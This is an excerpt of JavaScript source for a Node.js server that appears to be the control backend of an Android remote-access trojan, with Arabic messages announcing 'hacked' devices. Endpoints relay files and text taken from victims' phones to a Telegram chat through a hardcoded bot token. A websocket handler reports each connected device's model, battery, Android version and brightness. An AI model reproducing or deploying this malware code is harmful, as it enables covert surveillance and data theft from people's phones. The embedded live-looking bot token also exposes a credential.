...
const token = '6908926342:AAFP6zcaMMCexXDjAO4CsNGxW-W6bW8MYXQ'
const id = '6231198437'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم رفع الخادم بنجاح مع تحيات المطور سفير @sfeer009</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°•تم السحب من جهاز <b>${req.headers.model}</b> مبرمج البوت القياده سفير`,
            parse_mode: "HTML"
        },
        {
            filename: name,
...
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°•تم السحب من جهاز <b>${req.headers.model}</b> مبرمج البوت القياده سفير\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
...
appSocket.on('connection', (ws, req) => {
    ...
    appBot.sendMessage(id,
        `°• جهاز مخترق جديد المطور القياده سفير\n\n` +
    ...
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• جهاز غير متصل المطور القياده سفير\n\n` +
            `• نوع الجهاز : <b>${model}</b>\n` +
            `• البطاريه : <b>${battery}</b>\n` +
            `• اصدار الاندرويد : <b>${version}</b>\n` +
            `• سطوع الشاشه : <b>${brightness}</b>\n` +
